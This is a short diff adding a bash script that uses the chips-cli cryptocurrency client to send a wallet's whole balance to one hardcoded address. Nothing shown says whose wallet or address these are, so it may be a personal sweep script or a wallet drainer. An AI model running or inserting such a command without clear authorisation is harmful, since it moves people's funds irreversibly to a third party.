@@ -1,0 +1,2 @@
+#!/bin/bash
+chips-cli sendtoaddress RSuXRScqHNbRFqjur2C3tf3oDoauBs2B1i $(chips-cli getbalance) "" false
